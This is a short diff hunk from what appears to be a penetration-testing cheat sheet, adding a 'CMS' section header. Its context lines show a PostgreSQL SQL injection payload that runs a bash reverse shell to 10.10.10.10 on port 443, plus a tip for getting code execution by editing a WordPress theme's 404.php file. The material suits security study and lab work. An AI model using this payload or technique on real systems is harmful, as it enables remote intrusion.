@@ -182,6 +182,8 @@ stty rows <rownb> columns <colnb>
     '; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.10.10/443 0>&1'''; --
     ```
 
+# CMS {-}
+
 ## Wordpress {-}
 
 When we are connected to the wordpress admin panel, the trick is to modify Theme **404.php** file.
